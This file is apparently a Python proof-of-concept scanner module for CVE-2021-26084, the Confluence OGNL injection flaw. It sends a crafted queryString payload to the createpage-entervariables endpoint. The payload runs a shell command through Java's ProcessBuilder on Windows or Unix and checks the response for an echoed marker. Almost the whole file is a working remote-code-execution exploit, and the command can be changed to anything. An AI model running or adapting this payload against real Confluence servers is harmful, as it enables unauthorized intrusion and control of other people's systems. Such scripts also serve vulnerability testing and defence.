#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import headers
from bs4 import BeautifulSoup



########################################################################################################################
# 脚本信息
NAME='CVE_2021_26084'
AUTHOR="Trans"
REMARK='Confluence OGNL注入RCE'
FOFA_RULE=''
########################################################################################################################

def poc(target):

    result={}
    url = target + "/pages/createpage-entervariables.action?SpaceKey=x"
    session = requests.Session()
    try:
        cmd = "echo goodluckboy"
        xpl_data = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
        rawHTML = session.post(url, headers=headers, data=xpl_data,proxies=proxies)

        soup = BeautifulSoup(rawHTML.text, 'html.parser')
        queryStringValue = soup.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
        if 'goodluckboy' in queryStringValue:
            result["target"] = target
            result["poc"] = NAME
            result["url"] = url
            return 
        else:
            pass
    except:
        pass


if __name__ == '__main__':
    poc("127.0.0.1")